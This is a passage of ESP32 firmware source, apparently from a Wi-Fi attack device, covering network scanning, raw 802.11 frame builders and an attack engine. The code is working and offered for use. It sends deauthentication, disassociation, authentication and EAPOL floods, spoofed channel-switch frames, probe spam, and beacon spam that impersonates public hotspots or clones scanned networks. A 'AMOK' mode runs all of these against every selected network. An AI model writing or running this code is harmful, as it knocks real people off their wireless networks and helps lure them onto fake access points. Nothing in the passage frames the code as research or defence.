}

// --------------- SCANNING ----------------------
void doScan(bool deep = false) {
  attacking = false;
  setLed(false);
  WiFi.mode(WIFI_AP_STA);

  // Deep scan: scan all channels one by one with more detail
  if (deep) {
    scannedCount = 0;
    clientCount = 0;
    for (int ch = 1; ch <= 13; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      delay(40);
      int n = WiFi.scanNetworks(false, true, false, 120);
      for (int i = 0; i < n && scannedCount < MAX_SCAN; i++) {
        // Dedup
        bool dup = false;
        for (int j = 0; j < scannedCount; j++) {
          if (WiFi.BSSIDstr(i) == nets[j].bssidStr) { dup = true; break; }
        }
        if (dup) continue;
        nets[scannedCount].ssid = WiFi.SSID(i);
        memcpy(nets[scannedCount].bssid, WiFi.BSSID(i), 6);
        nets[scannedCount].bssidStr = WiFi.BSSIDstr(i);
        nets[scannedCount].channel = WiFi.channel(i);
        nets[scannedCount].rssi = WiFi.RSSI(i);
        nets[scannedCount].enc = WiFi.encryptionType(i);
        nets[scannedCount].selected = false;
        scannedCount++;
      }
    }
  } else {
    int n = WiFi.scanNetworks(false, true);
    scannedCount = 0;
    for (int i = 0; i < n && scannedCount < MAX_SCAN; i++) {
      nets[scannedCount].ssid = WiFi.SSID(i);
      memcpy(nets[scannedCount].bssid, WiFi.BSSID(i), 6);
      nets[scannedCount].bssidStr = WiFi.BSSIDstr(i);
      nets[scannedCount].channel = WiFi.channel(i);
      nets[scannedCount].rssi = WiFi.RSSI(i);
      nets[scannedCount].enc = WiFi.encryptionType(i);
      nets[scannedCount].selected = false;
      scannedCount++;
    }
  }

  // Sort by RSSI descending
  for (int i = 0; i < scannedCount - 1; i++) {
    for (int j = i + 1; j < scannedCount; j++) {
      if (nets[j].rssi > nets[i].rssi) {
        NetInfo t = nets[i];
        nets[i] = nets[j];
        nets[j] = t;
      }
    }
  }

  // Sniff nearby clients (promiscuous)
  clientCount = 0;
  // Use promiscuous callback briefly
  // Simplified: we populate from stored data
  lastScanMs = millis();
}

int selectedCount() {
  int c = 0;
  for (int i = 0; i < scannedCount; i++) {
    if (nets[i].selected && passesFilter(i)) c++;
  }
  return c;
}

// --------------- FRAME BUILDERS ----------------
void setReasonOnFrames() {
  uint8_t lo = (uint8_t)(reasonCode & 0xFF);
  uint8_t hi = (uint8_t)((reasonCode >> 8) & 0xFF);
  deauthFrame[24] = lo; deauthFrame[25] = hi;
  disassocFrame[24] = lo; disassocFrame[25] = hi;
  deauthRevFrame[24] = lo; deauthRevFrame[25] = hi;
}

void fillApToSta(uint8_t* frame, const uint8_t* bssid) {
  memset(&frame[4], 0xFF, 6);
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
}

void fillStaToAp(uint8_t* frame, const uint8_t* bssid) {
  memcpy(&frame[4], bssid, 6);
  memset(&frame[10], 0xFF, 6);
  memcpy(&frame[16], bssid, 6);
  frame[10] = 0x01; frame[11] = 0x02; frame[12] = 0x03;
  frame[13] = 0x04; frame[14] = 0x05; frame[15] = 0x06;
}

void buildAuthFrame(const uint8_t* bssid) {
  memset(authFrame, 0, sizeof(authFrame));
  authFrame[0] = 0xB0; // Auth
  memset(&authFrame[4], 0xFF, 6);          // dest broadcast
  // source = random
  uint8_t src[6];
  src[0] = 0xAA; src[1] = 0xBB; src[2] = 0xCC;
  src[3] = (uint8_t)(millis() >> 16);
  src[4] = (uint8_t)(millis() >> 8);
  src[5] = (uint8_t)(millis() & 0xFF);
  memcpy(&authFrame[10], src, 6);
  memcpy(&authFrame[16], bssid, 6);       // BSSID = AP
  // Auth algorithm = 0 (open), seq = 1, status = 0
  authFrame[24] = 0x00; authFrame[25] = 0x00; // algorithm
  authFrame[26] = 0x01; authFrame[27] = 0x00; // seq
  authFrame[28] = 0x00; authFrame[29] = 0x00; // status
}

void buildCsaFrame(const uint8_t* bssid, uint8_t targetCh) {
  memset(actionFrame, 0, sizeof(actionFrame));
  actionFrame[0] = 0xD0; // Action frame
  memset(&actionFrame[4], 0xFF, 6);
  memcpy(&actionFrame[10], bssid, 6);
  memcpy(&actionFrame[16], bssid, 6);
  // Category = 0 (Spectrum Mgmt), Action = 7 (Channel Switch Announcement)
  actionFrame[24] = 0x00;                  // Category
  actionFrame[25] = 0x07;                  // CSA action
  actionFrame[26] = 0x00;                  // Switch mode
  actionFrame[27] = targetCh;              // New channel
  actionFrame[28] = 0x00;                  // Switch count
}

void buildEapolStart(const uint8_t* bssid) {
  // We'll reuse actionFrame buffer for EAPOL
  memset(actionFrame, 0, sizeof(actionFrame));
  // 802.1X with EAPOL-start
  // Simplified: we'll send raw EAPOL frames
  actionFrame[0] = 0x88; actionFrame[1] = 0x8E; // Ethertype
  memset(&actionFrame[4], 0xFF, 6);
  uint8_t src[6] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
  src[5] = (uint8_t)(millis() & 0xFF);
  memcpy(&actionFrame[10], src, 6);
  memcpy(&actionFrame[16], bssid, 6);
  actionFrame[24] = 0x01; // Version
  actionFrame[25] = 0x01; // Type: EAPOL-Start
  actionFrame[26] = 0x00; actionFrame[27] = 0x00; // Length
}

void buildBeacon(const String& ssid, const uint8_t* bssid, uint8_t ch) {
  memset(beaconFrame, 0, sizeof(beaconFrame));
  beaconFrame[0] = 0x80;
  memset(&beaconFrame[4], 0xFF, 6);
  memcpy(&beaconFrame[10], bssid, 6);
  memcpy(&beaconFrame[16], bssid, 6);
  beaconFrame[32] = 0x64; beaconFrame[33] = 0x00;
  beaconFrame[34] = 0x01; beaconFrame[35] = 0x04;
  int pos = 36;
  beaconFrame[pos++] = 0x00;
  uint8_t len = (uint8_t)min((int)ssid.length(), 32);
  beaconFrame[pos++] = len;
  for (uint8_t i = 0; i < len; i++) beaconFrame[pos++] = (uint8_t)ssid.charAt(i);
  // Supported rates
  beaconFrame[pos++] = 0x01; beaconFrame[pos++] = 0x08;
  beaconFrame[pos++] = 0x82; beaconFrame[pos++] = 0x84;
  beaconFrame[pos++] = 0x8b; beaconFrame[pos++] = 0x96;
  beaconFrame[pos++] = 0x24; beaconFrame[pos++] = 0x30;
  beaconFrame[pos++] = 0x48; beaconFrame[pos++] = 0x6c;
  // DS channel
  beaconFrame[pos++] = 0x03; beaconFrame[pos++] = 0x01; beaconFrame[pos++] = ch;
  // Add country info for extra legitimacy
  beaconFrame[pos++] = 0x07; beaconFrame[pos++] = 0x03;
  beaconFrame[pos++] = 0x55; beaconFrame[pos++] = 0x53; // "US"
  beaconFrame[pos++] = 0x11; // Maximum transmit power
  // Store length in overflow byte (we'll use a sentinel)
  beaconFrame[255] = (uint8_t)pos;
}

// --------------- PACKET SENDERS ----------------
void sendMgmtBurst(const uint8_t* bssid, uint8_t ch) {
  setReasonOnFrames();
  memcpy(deauthRevFrame, deauthFrame, 26);
  fillApToSta(deauthFrame, bssid);
  fillApToSta(disassocFrame, bssid);
  fillStaToAp(deauthRevFrame, bssid);

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;

  int bursts = constrain(intensity, 1, 32);
  for (int i = 0; i < bursts; i++) {
    if (attackMode == MODE_DEAUTH || attackMode == MODE_BOTH || attackMode == MODE_AMOK) {
      esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
      packetsSent++; pktsWindow++; deauthCount++;
      if (biDirectional) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthRevFrame, 26, false);
        packetsSent++; pktsWindow++; deauthCount++;
      }
    }
    if (attackMode == MODE_DISASSOC || attackMode == MODE_BOTH || attackMode == MODE_AMOK) {
      esp_wifi_80211_tx(WIFI_IF_AP, disassocFrame, 26, false);
      packetsSent++; pktsWindow++; disassocCount++;
    }
  }
}

void sendBeaconSpam() {
  uint8_t fakeMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01};
  static const char* fakeNames[] = {
    "Free_WiFi", "Airport_Free", "Starbucks", "Hotel_Guest",
    "Public_WiFi", "AndroidAP", "iPhone", "TP-LINK_Guest",
    "DIRECT-TV", "xfinitywifi", "ATT-WiFi", "McDonalds_Free",
    "Verizon_Hotspot", "Spectrum_Free", "Library_Guest", "School_WiFi",
    "Cafe_WiFi", "Guest_Network", "WiFi_2.4G", "WiFi_5G"
  };
  static int nameIdx = 0;

  if (randomizeMac) {
    fakeMac[0] = (uint8_t)(millis() >> 16);
    fakeMac[1] = (uint8_t)(millis() >> 8);
    fakeMac[2] = (uint8_t)(millis() & 0xFF);
  }
  fakeMac[4] = (uint8_t)(millis() & 0xFF);
  fakeMac[5]++;

  String name;
  uint8_t ch = 1 + (nameIdx % 13);

  if (cloneBeacons && selectedCount() > 0) {
    int seen = 0;
    int pick = nameIdx % selectedCount();
    for (int i = 0; i < scannedCount; i++) {
      if (!nets[i].selected || !passesFilter(i)) continue;
      if (seen == pick) {
        name = nets[i].ssid.length() ? nets[i].ssid : String("Hidden_") + String(i);
        ch = nets[i].channel;
        memcpy(fakeMac, nets[i].bssid, 6);
        fakeMac[5] ^= (uint8_t)nameIdx;
        break;
      }
      seen++;
    }
  }
  if (name.length() == 0) name = fakeNames[nameIdx % 20];
  nameIdx++;

  buildBeacon(name, fakeMac, ch);
  uint8_t flen = beaconFrame[255];
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;

  int bursts = constrain(intensity, 1, 32);
  for (int i = 0; i < bursts; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, flen, false);
    packetsSent++; pktsWindow++; beaconCount++;
  }
}

void sendProbeSpam() {
  uint8_t src[6] = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x01};
  if (randomizeMac) {
    src[0] = (uint8_t)(millis() >> 16);
    src[1] = (uint8_t)(millis() >> 8);
  }
  src[5]++;

  // Rotate through known SSIDs from scan or use wildcard
  static int ssidIdx = 0;
  String probeSsid;
  if (selectedCount() > 0) {
    int pick = ssidIdx % selectedCount();
    int seen = 0;
    for (int i = 0; i < scannedCount; i++) {
      if (!nets[i].selected || !passesFilter(i)) continue;
      if (seen == pick) { probeSsid = nets[i].ssid; break; }
      seen++;
    }
    ssidIdx++;
  }

  memset(probeFrame, 0, sizeof(probeFrame));
  probeFrame[0] = 0x40; // Probe request
  memset(&probeFrame[4], 0xFF, 6);
  memcpy(&probeFrame[10], src, 6);
  memset(&probeFrame[16], 0xFF, 6);
  int pos = 24;

  if (probeSsid.length() > 0) {
    // Directed probe
    probeFrame[pos++] = 0x00;
    uint8_t slen = min((int)probeSsid.length(), 32);
    probeFrame[pos++] = slen;
    for (uint8_t i = 0; i < slen; i++) probeFrame[pos++] = (uint8_t)probeSsid.charAt(i);
  } else {
    // Wildcard probe
    probeFrame[pos++] = 0x00;
    probeFrame[pos++] = 0x00;
  }

  // Supported rates
  probeFrame[pos++] = 0x01; probeFrame[pos++] = 0x04;
  probeFrame[pos++] = 0x82; probeFrame[pos++] = 0x84;
  probeFrame[pos++] = 0x8b; probeFrame[pos++] = 0x96;

  uint8_t ch = (channelFilter > 0) ? channelFilter : (1 + (src[5] % 13));
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;

  int bursts = constrain(intensity, 1, 32);
  for (int i = 0; i < bursts; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, probeFrame, pos, false);
    packetsSent++; pktsWindow++; probeCount++;
  }
}

void sendAuthFlood(const uint8_t* bssid, uint8_t ch) {
  buildAuthFrame(bssid);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;
  int bursts = constrain(intensity, 1, 32);
  for (int i = 0; i < bursts * 2; i++) {
    // Randomize source MAC each time for maximum impact
    authFrame[13] = (uint8_t)(millis() & 0xFF);
    authFrame[14] = (uint8_t)(millis() >> 8);
    authFrame[15] = (uint8_t)(millis() >> 16);
    esp_wifi_80211_tx(WIFI_IF_AP, authFrame, 30, false);
    packetsSent++; pktsWindow++; authCount++;
  }
}

void sendCsaSpoof(const uint8_t* bssid, uint8_t ch) {
  // Announce channel switch to channel 14 (invalid/suboptimal) or random
  uint8_t fakeCh = 11 + (millis() % 3); // 11, 12, or 13 (high interference)
  buildCsaFrame(bssid, fakeCh);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;
  int bursts = constrain(intensity, 1, 8);
  for (int i = 0; i < bursts; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, actionFrame, 29, false);
    packetsSent++; pktsWindow++; actionCount++;
  }
}

void sendEapolFlood(const uint8_t* bssid, uint8_t ch) {
  buildEapolStart(bssid);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  currentAttackCh = ch;
  int bursts = constrain(intensity, 1, 16);
  for (int i = 0; i < bursts; i++) {
    actionFrame[13] = (uint8_t)(millis() & 0xFF);
    esp_wifi_80211_tx(WIFI_IF_AP, actionFrame, 28, false);
    packetsSent++; pktsWindow++; deauthCount++; // count as deauth-like
  }
}

// --------------- ATTACK ENGINE -----------------
void runAttackTick() {
  if (attackTimerSec > 0) {
    unsigned long elapsed = (millis() - attackStartMs) / 1000UL;
    if (elapsed >= (unsigned long)attackTimerSec) {
      attacking = false;
      setLed(false);
      attackLabel = "TIMER STOPPED";
      return;
    }
  }

  // Auto-cycle channels if enabled
  if (autoCycle && (millis() - lastCycleMs > (unsigned long)autoCycleMs)) {
    lastCycleMs = millis();
    currentAttackCh = (currentAttackCh % 13) + 1;
    if (channelFilter > 0) currentAttackCh = channelFilter;
  }

  // Channel-agnostic attack modes
  if (attackMode == MODE_BEACON || attackMode == MODE_PROBE) {
    if (attackMode == MODE_BEACON) {
      sendBeaconSpam();
      attackLabel = cloneBeacons ? "BEACON (clone)" : "BEACON SPAM";
    } else {
      sendProbeSpam();
      attackLabel = "PROBE SPAM";
    }
    return;
  }

  // Channel-agnostic: Auth, CSA, EAPOL (operate on all selected)
  if (attackMode == MODE_AUTH) {
    attackLabel = "AUTH FLOOD";
    for (int i = 0; i < scannedCount; i++) {
      if (!nets[i].selected || !passesFilter(i)) continue;
      sendAuthFlood(nets[i].bssid, nets[i].channel);
    }
    return;
  }
  if (attackMode == MODE_CSA) {
    attackLabel = "CSA SPOOF";
    for (int i = 0; i < scannedCount; i++) {
      if (!nets[i].selected || !passesFilter(i)) continue;
      sendCsaSpoof(nets[i].bssid, nets[i].channel);
    }
    return;
  }
  if (attackMode == MODE_EAPOL) {
    attackLabel = "EAPOL FLOOD";
    for (int i = 0; i < scannedCount; i++) {
      if (!nets[i].selected || !passesFilter(i)) continue;
      sendEapolFlood(nets[i].bssid, nets[i].channel);
    }
    return;
  }
  if (attackMode == MODE_AMOK) {
    attackLabel = "AMOK ONSLAUGHT";
    for (int i = 0; i < scannedCount; i++) {
      if (!nets[i].selected || !passesFilter(i)) continue;
      sendMgmtBurst(nets[i].bssid, nets[i].channel);
      sendAuthFlood(nets[i].bssid, nets[i].channel);
      sendCsaSpoof(nets[i].bssid, nets[i].channel);
      sendEapolFlood(nets[i].bssid, nets[i].channel);
    }
    // Also spam beacons/probes
    sendBeaconSpam();
    sendProbeSpam();
    return;
  }

  // Standard deauth/disassoc/both
  int sel = selectedCount();
  if (sel == 0) {
    attacking = false;
    setLed(false);
    return;
  }

  attackLabel = String(sel) + " target(s)";
  for (int i = 0; i < scannedCount; i++) {
    if (!nets[i].selected || !passesFilter(i)) continue;
    sendMgmtBurst(nets[i].bssid, nets[i].channel);
  }
}

